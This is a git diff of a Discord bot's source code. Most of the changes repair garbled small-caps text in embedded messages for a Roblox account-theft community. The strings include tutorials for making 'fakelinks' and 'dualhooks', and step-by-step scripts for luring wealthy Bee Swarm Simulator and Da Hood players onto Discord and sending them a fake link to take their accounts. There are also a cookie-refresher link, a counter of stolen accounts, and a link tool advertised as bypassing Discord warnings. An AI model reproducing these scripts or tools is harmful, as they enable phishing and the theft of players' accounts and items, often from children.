@@ -669,7 +669,7 @@ client.on("messageCreate", async (message) => {
         message: "https://youtu.be/M36orZU8j4Q?si=8M0IyAB886rgE04Q"
       },
       {
-        title: "��ᴏᴏᴋɪᴇ ʟᴏɢɪɴ (ɪᴏꜱ ᴍᴏʙɪʟᴇ)",
+        title: "ᴄᴏᴏᴋɪᴇ ʟᴏɢɪɴ (ɪᴏꜱ ᴍᴏʙɪʟᴇ)",
         message: "https://youtu.be/eP6dLhv0UKY?si=IDRwYwdAKokMVxas"
       },
       {
@@ -678,7 +678,7 @@ client.on("messageCreate", async (message) => {
       },
       {
         title: "ʜᴏᴡ ᴛᴏ ᴍᴀᴋᴇ ꜰᴀᴋᴇʟɪɴᴋ ᴛᴜᴛᴏʀɪᴀʟ (ᴍᴀɪɴ ꜱɪᴛᴇ)",
-        message: "**ᴛᴜᴛᴏʀɪᴀʟ ᴏɴ ʜᴏᴡ ᴛᴏ ᴍᴀᴋᴇ ꜰᴀᴋᴇʟɪɴᴋ**\n\n**ᴄʟɪᴄᴋ �����ʜɪꜱ ᴄʜᴀɴɴᴇʟ ᴛᴏ ɢᴏ ᴛᴏ ᴛʜᴇ ꜱɪᴛᴇꜱ**\n\nhttps://discord.com/channels/1500661537415630898/1509362001980166306\n\nhttps://streamable.com/n142e2"
+        message: "**ᴛᴜᴛᴏʀɪᴀʟ ᴏɴ ʜᴏᴡ ᴛᴏ ᴍᴀᴋᴇ ꜰᴀᴋᴇʟɪɴᴋ**\n\n**ᴄʟɪᴄᴋ ᴛʜɪꜱ ᴄʜᴀɴɴᴇʟ ᴛᴏ ɢᴏ ᴛᴏ ᴛʜᴇ ꜱɪᴛᴇꜱ**\n\nhttps://discord.com/channels/1500661537415630898/1509362001980166306\n\nhttps://streamable.com/n142e2"
       }
     ];
 
@@ -725,7 +725,7 @@ client.on("messageCreate", async (message) => {
         name: "ᴅᴜᴀʟʜᴏᴏᴋ",
         image1: "https://cdn.discordapp.com/attachments/1506434367491276812/1509399153321443388/image0_1.gif?ex=6a190901&is=6a17b781&hm=8d73fe9824d744a19022718c65a469779f8e8f9f86e82a0b5fda2f9010d9da5a",
         image2: "https://cdn.discordapp.com/attachments/1506434367491276812/1509394265141415936/1773637630733-5bee7763-8a95-48c0-8857-b9f2196e8d11.gif?ex=6a190473&is=6a17b2f3&hm=2866b7b7ca9eff6d39f1ccbc30640a1ee0fa62adac8619771cf9d455c329a76b",
-        body: "**── ᴅᴜᴀʟʜᴏᴏᴋ ᴍᴇᴛʜ ──**\n\n**ꜱᴛᴇᴘ 1: ᴄʀᴇᴀᴛᴇ ᴀ ꜱᴇʀᴠᴇʀ & ᴛʜᴇ ᴅᴜᴀʟʜᴏᴏᴋ ʟɪɴᴋ ɪɴ ᴛʜᴇ ᴡᴇʙꜱɪᴛᴇ ᴡʜᴇʀᴇ ʏᴏᴜ ᴀʀᴇ ᴛᴇᴀᴄʜɪɴɢ ᴍᴇᴍʙᴇʀꜱ ʜᴏᴡ ᴛᴏ ɢᴇᴛ ʜɪᴛꜱ ᴀᴛ ᴛʜᴇ ꜱᴀᴍᴇ ᴛɪᴍᴇ, ʏᴏᴜ'ʟʟ ʙᴇ ꜱᴛᴇᴀʟɪɴɢ ᴛʜᴇɪʀ ʜɪᴛꜱ**\n\n**ꜱᴛᴇᴘ 2: ʜᴇᴀᴅ ᴏᴠᴇʀ ᴛᴏ**\nhttps://discord.com/template/Cg2G6AdH6ZkR\n**ᴅᴏᴇꜱɴᴛ ʜᴀᴠᴇ ᴛᴏ ʙᴇ ᴇxᴀᴄᴛʟʏ ʟɪᴋᴇ ᴛʜᴀᴛ ʙᴜᴛ, ɪᴛ ᴅᴏᴇꜱ ʜᴀᴠᴇ ᴛᴏ ʜᴀᴠᴇ ᴛʜᴇ ꜱᴇʀᴠᴇʀ ᴀꜱᴘᴇᴄᴛꜱ.**\n\n**ꜱᴛᴇᴘ 3: ᴏɴᴄᴇ ʏᴏᴜ ꜰɪɴɪꜱʜᴇᴅ ᴡɪᴛʜ ʏᴏᴜʀ ᴡʜᴏʟᴇ ꜱᴇʀᴠᴇʀ ᴀɴᴅ ᴅᴏɴᴇ ᴡɪᴛʜ ɪᴛ, ᴛʀʏ ᴛᴏ ᴘᴀʀᴛɴᴇʀ ᴡɪᴛʜ ᴀꜱ ᴍᴀɴʏ ꜱᴇʀᴠ��ʀꜱ ᴀꜱ ʏᴏᴜ ᴄᴀɴ, ɪɴᴠɪᴛᴇ ʏᴏᴜʀ ꜰʀɪᴇɴᴅꜱ, ᴀɴᴅ ᴇᴠᴇɴ ꜱᴛᴇᴀʟ ᴍᴇᴍʙᴇʀꜱ ᴏᴜᴛ ᴏꜰ ᴅɪꜰꜰᴇʀᴇɴᴛ ꜱᴇʀᴠᴇʀꜱ ꜱᴇᴄʀᴇᴛʟʏ**\n\n**ꜱᴛᴇᴘ 4: ʏᴏᴜ ᴅᴏ ᴡᴀɴᴛ ᴛᴏ ʜᴀᴠᴇ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ ᴀᴄᴛɪᴠᴇ, ᴀᴅᴅ ᴍᴏᴅꜱ, ᴀᴅᴍɪɴꜱ, ᴀɴᴅ ᴍᴀʏʙᴇ ᴇᴠᴇɴ ᴀ ᴄᴏ-ᴏᴡɴᴇʀ!!**\n\n**ᴛᴜᴛᴏʀɪᴀʟ:**\nhttps://streamable.com/u88d7u"
+        body: "**── ᴅᴜᴀʟʜᴏᴏᴋ ᴍᴇᴛʜ ──**\n\n**ꜱᴛᴇᴘ 1: ᴄʀᴇᴀᴛᴇ ᴀ ꜱᴇʀᴠᴇʀ & ᴛʜᴇ ᴅᴜᴀʟʜᴏᴏᴋ ʟɪɴᴋ ɪɴ ᴛʜᴇ ᴡᴇʙꜱɪᴛᴇ ᴡʜᴇʀᴇ ʏᴏᴜ ᴀʀᴇ ᴛᴇᴀᴄʜɪɴɢ ᴍᴇᴍʙᴇʀꜱ ʜᴏᴡ ᴛᴏ ɢᴇᴛ ʜɪᴛꜱ ᴀᴛ ᴛʜᴇ ꜱᴀᴍᴇ ᴛɪᴍᴇ, ʏᴏᴜ'ʟʟ ʙᴇ ꜱᴛᴇᴀʟɪɴɢ ᴛʜᴇɪʀ ʜɪᴛꜱ**\n\n**ꜱᴛᴇᴘ 2: ʜᴇᴀᴅ ᴏᴠᴇʀ ᴛᴏ**\nhttps://discord.com/template/Cg2G6AdH6ZkR\n**ᴅᴏᴇꜱɴᴛ ʜᴀᴠᴇ ᴛᴏ ʙᴇ ᴇxᴀᴄᴛʟʏ ʟɪᴋᴇ ᴛʜᴀᴛ ʙᴜᴛ, ɪᴛ ᴅᴏᴇꜱ ʜᴀᴠᴇ ᴛᴏ ʜᴀᴠᴇ ᴛʜᴇ ꜱᴇʀᴠᴇʀ ᴀꜱᴘᴇᴄᴛꜱ.**\n\n**ꜱᴛᴇᴘ 3: ᴏɴᴄᴇ ʏᴏᴜ ꜰɪɴɪꜱʜᴇᴅ ᴡɪᴛʜ ʏᴏᴜʀ ᴡʜᴏʟᴇ ꜱᴇʀᴠᴇʀ ᴀɴᴅ ᴅᴏɴᴇ ᴡɪᴛʜ ɪᴛ, ᴛʀʏ ᴛᴏ ᴘᴀʀᴛɴᴇʀ ᴡɪᴛʜ ᴀꜱ ᴍᴀɴʏ ꜱᴇʀᴠᴇʀꜱ ᴀꜱ ʏᴏᴜ ᴄᴀɴ, ɪɴᴠɪᴛᴇ ʏᴏᴜʀ ꜰʀɪᴇɴᴅꜱ, ᴀɴᴅ ᴇᴠᴇɴ ꜱᴛᴇᴀʟ ᴍᴇᴍʙᴇʀꜱ ᴏᴜᴛ ᴏꜰ ᴅɪꜰꜰᴇʀᴇɴᴛ ꜱᴇʀᴠᴇʀꜱ ꜱᴇᴄʀᴇᴛʟʏ**\n\n**ꜱᴛᴇᴘ 4: ʏᴏᴜ ᴅᴏ ᴡᴀɴᴛ ᴛᴏ ʜᴀᴠᴇ ʏᴏᴜʀ ꜱᴇʀᴠᴇʀ ᴀᴄᴛɪᴠᴇ, ᴀᴅᴅ ᴍᴏᴅꜱ, ᴀᴅᴍɪɴꜱ, ᴀɴᴅ ᴍᴀʏʙᴇ ᴇᴠᴇɴ ᴀ ᴄᴏ-ᴏᴡɴᴇʀ!!**\n\n**ᴛᴜᴛᴏʀɪᴀʟ:**\nhttps://streamable.com/u88d7u"
       },
       {
         name: "ᴛɪᴋᴛᴏᴋ ɴᴏᴛ ʟɪᴠᴇ",
@@ -746,10 +746,10 @@ client.on("messageCreate", async (message) => {
       {
         name: "ʙꜱꜱ ᴍᴇᴛʜᴏᴅ",
         plainText: true,
-        body: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━���━━�����━━━\n\nBSS VERY OP METHOD (TWO ACCOUNT WITH 18-20 HIVES PER DAY)\n\n1. Go to https://bssmvalues.com/\n\n2. Look for rich people, give them a good overpay and tell them to add you on Discord\n\n3. Once on Discord, say: \"Just join my private server to trade\" — then send the fake link\n\n4. Get their account and stuff\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nBSS TRADING SERVERS:\n\nhttps://discord.gg/swWaqafh4B\nhttps://discord.com/invite/bssm\nhttps://discord.com/invite/bsstrades-1213173775366094909\nhttps://discord.com/servers/bee-swarm-simulator-trading-server-1179032518444462090\nhttps://discord.com/invite/bee-swarm-simulator-values-1196133860245778462\nhttps://discord.com/invite/uaRUqUbuy7\nhttps://discord.com/invite/bee\nhttps://discord.com/invite/bss-helping-809858765141835786\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nEasy hits — don't sleep on this!\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        body: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nBSS VERY OP METHOD (TWO ACCOUNT WITH 18-20 HIVES PER DAY)\n\n1. Go to https://bssmvalues.com/\n\n2. Look for rich people, give them a good overpay and tell them to add you on Discord\n\n3. Once on Discord, say: \"Just join my private server to trade\" — then send the fake link\n\n4. Get their account and stuff\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nBSS TRADING SERVERS:\n\nhttps://discord.gg/swWaqafh4B\nhttps://discord.com/invite/bssm\nhttps://discord.com/invite/bsstrades-1213173775366094909\nhttps://discord.com/servers/bee-swarm-simulator-trading-server-1179032518444462090\nhttps://discord.com/invite/bee-swarm-simulator-values-1196133860245778462\nhttps://discord.com/invite/uaRUqUbuy7\nhttps://discord.com/invite/bee\nhttps://discord.com/invite/bss-helping-809858765141835786\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nEasy hits — don't sleep on this!\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
       },
       {
-        name: "�������ʜ������������ᴏᴅ ᴍᴇᴛʜᴏᴅ",
+        name: "ᴅᴀʜᴏᴏᴅ ᴍᴇᴛʜᴏᴅ",
         plainText: true,
         body: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nDAHOOD OP METHOD (2 korblox per day)\n\n1. Find very rich people on server (with funny or dumb skin)\n\n2. For example, he has Heaven Knife skin — say: \"Did you get Heaven Knife?\"\n\n3. Victim says: \"Yes I do\"\n\n4. Say: \"My friend can give you a sword that is twice as expensive\"\n\n5. He agrees — tell him he needs to add your friend on Discord\n\n6. He adds you on Discord — start a normal dialogue about the trade\n\n7. Then send a fake link and get very expensive items + the account\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nEasy Korblox — just play it cool!\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
       },
@@ -858,7 +858,7 @@ client.on("messageCreate", async (message) => {
       console.log("[v0] Starting beam channel structure creation...");
       const guild = message.guild;
 
-      const purgeChannelNames = ["���⌇・ᴄᴏᴍᴍᴀɴᴅꜱ", "🗨️⌇・ᴄʜᴀᴛ", "💸⌇・ꜰʟᴇx𓏵ᴛʀᴀᴅᴇ"];
+      const purgeChannelNames = ["⌇・ᴄᴏᴍᴍᴀɴᴅꜱ", "🗨️⌇・ᴄʜᴀᴛ", "💸⌇・ꜰʟᴇx𓏵ᴛʀᴀᴅᴇ"];
       const newPurgeChannels = [];
 
       // Create community category and channels
@@ -869,7 +869,7 @@ client.on("messageCreate", async (message) => {
       });
 
       const commChannels = [
-        { name: "������ᴠᴇʀɪꜰ��", webhook: true },
+        { name: "ᴠᴇʀɪꜰʏ", webhook: true },
         { name: "🔧┋ᴛᴏᴏʟꜱ", webhook: true },
         { name: "🧷┋ꜱɪᴛᴇꜱ", webhook: true }
       ];
@@ -938,7 +938,7 @@ client.on("messageCreate", async (message) => {
   if (content === `${PREFIX}ticket`) {
     const ticketEmbed = new EmbedBuilder()
       .setDescription(
-        "*<a:emoji_13:1508646379751342130> ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ꜱᴜᴘᴘᴏʀᴛ ᴛɪᴄᴋᴇᴛ\n ɪꜰ ʏᴏᴜ ʜᴀᴠᴇ ᴀɴʏ ᴄᴏɴᴄᴇʀɴꜱ ᴊᴜꜱᴛ ᴄʀᴇᴀᴛᴇ ᴀ ᴛɪᴄᴋᴇᴛ*"
+        "*<a:emoji_13:1508646379751342130> ᴄʟɪᴄᴋ ʙᴇʟᴏᴡ ᴛᴏ ᴄʀᴇᴀᴛᴇ ᴀ ꜱᴜᴘᴘᴏʀᴛ ᴛɪᴄᴋᴇᴛ\n ɪꜰ ʏᴏᴜ ʜᴀᴠᴇ ᴀɴʏ ᴄᴏɴᴄᴇʀɴꜱ ᴊᴜꜱᴛ ᴄʀᴇᴀᴛᴇ ᴀ ���ɪᴄᴋᴇᴛ*"
       )
       .setImage("https://cdn.discordapp.com/attachments/1526768353761427456/1527916930441412618/a_3ce24509633cbbceab6dbbd4502d1ef8.gif?ex=6a5c6707&is=6a5b1587&hm=a281dd7928a445ea08a1a83146cc512b2322379ffbca7b038fe98720c66a7566&")
       .setThumbnail("https://cdn.discordapp.com/attachments/1526768353761427456/1527917480398557275/d_discord.png?ex=6a5c678a&is=6a5b160a&hm=5f07069678e350d5e0407caccb642ea22b488df3798a199494e71f0ee7fccda2&");
@@ -994,7 +994,7 @@ client.on("messageCreate", async (message) => {
     const toolsRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder()
         .setURL("https://refresher.fwh.is/?i=1")
-        .setLabel("ᴄᴏᴏᴋɪᴇ ʀ������ʀᴇ��ʜᴇʀ")
+        .setLabel("ᴄᴏᴏᴋɪᴇ ʀᴇꜰʀᴇꜱʜᴇʀ")
         .setStyle(ButtonStyle.Link)
         .setEmoji({ id: "1508646379751342130", name: "emoji_13", animated: true }),
       new ButtonBuilder()
@@ -1365,7 +1365,7 @@ client.on("messageCreate", async (message) => {
 \`\`\`
 ** <:91_item_hat:1510524528550477934> ᴛᴏᴛᴀʟ ʙɪɢ ꜱᴛᴀᴛꜱ **
 \`\`\`text
-ᴀᴄᴄᴏᴜɴᴛ��: ${(dataObj.Accounts || 0).toLocaleString()}
+ᴀᴄᴄᴏᴜɴᴛꜱ: ${(dataObj.Accounts || 0).toLocaleString()}
 ʀᴀᴘ: ${(dataObj.Rap || 0).toLocaleString()}
 ʙᴀʟᴀɴᴄᴇ: ${(dataObj.Balance || 0).toLocaleString()}
 \`\`\``;
@@ -2670,8 +2670,8 @@ client.on("messageCreate", async (message) => {
   const embed = new EmbedBuilder()
     .setDescription(
       "**─── <a:emoji_8:1506236357775720548> `ɪɴꜱᴀɴɪᴛʏ   | ʜʏᴘᴇʀʟɪɴᴋ` <a:emoji_8:1506236357775720548> ───\n\n" +
-      "<a:emoji_13:1508646379751342130> ᴜꜱᴇ ��ʜɪꜱ ᴛᴏᴏʟ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʜʏᴘᴇʀʟɪɴᴋꜱ ᴛʜᴀᴛ ʙʏᴘᴀꜱꜱ ᴅɪꜱᴄᴏʀᴅ ᴡᴀʀɴɪɴɢꜱ\n\n" +
-      "<:emoji_14:1508646444607864872> ʙᴇꜱᴛ ʜʏ��ᴇʀʟɪɴᴋ ᴏꜰ ᴀʟʟ ᴛɪᴍᴇ**"
+      "<a:emoji_13:1508646379751342130> ᴜꜱᴇ ᴛʜɪꜱ ᴛᴏᴏʟ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʜʏᴘᴇʀʟɪɴᴋꜱ ᴛʜᴀᴛ ʙʏᴘᴀꜱꜱ ᴅɪꜱᴄᴏʀᴅ ᴡᴀʀɴɪɴɢꜱ\n\n" +
+      "<:emoji_14:1508646444607864872> ʙᴇꜱᴛ ʜʏᴘᴇʀʟɪɴᴋ ᴏꜰ ᴀʟʟ ᴛɪᴍᴇ**"
     )
     .setImage("https://image2url.com/r2/default/gifs/1768488617981-bdc4c780-144f-4a40-8906-ddf01eadb705.gif")
     .setFooter({
